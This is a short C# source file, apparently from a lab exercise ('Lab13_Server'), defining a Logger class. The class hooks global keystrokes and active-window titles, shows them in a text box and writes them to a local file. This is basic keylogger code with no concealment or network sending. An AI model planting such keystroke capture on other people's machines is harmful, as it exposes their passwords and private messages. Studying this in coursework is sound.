using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Lab13_Server
{
    class Logger
    {
        private WQLUtil.Util.Window.WindowManager w;
        private WQLUtil.Util.Mouse.MouseManager m;
        private RichTextBox richTextBox1;
        private StreamWriter sw;

        public Logger(RichTextBox richTextBox1)
        {
            this.richTextBox1 = richTextBox1;
            w = new WQLUtil.Util.Window.WindowManager(WinEventProc);
            m = new WQLUtil.Util.Mouse.MouseManager();
            m.Hook.KeyPress += new KeyPressEventHandler(ExtKeyPress);
            m.Hook.KeyUp += new KeyEventHandler(ExtKeyUp);
            sw = new StreamWriter("Sample.txt");
        }

        private void Log(string txt)
        {
            richTextBox1.AppendText(txt+" \n");
            sw.WriteLine(txt + " \n");
            if (txt.Contains("Escape"))
            {
                sw.Close();
            }
        }

        public void ExtKeyPress(object sender, KeyPressEventArgs e)
        {
            Log("KeyPress:  " + e.KeyChar);
        }

        public void ExtKeyUp(object sender, KeyEventArgs e)
        {
            Log("KeyUp: " + e.KeyData.ToString());
        }

        public void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
        {
            Log("Active Window - " + WQLUtil.Util.Window.WindowManager.GetActiveWindowTitle() + "\r\n");
        }
        
    }

    
}
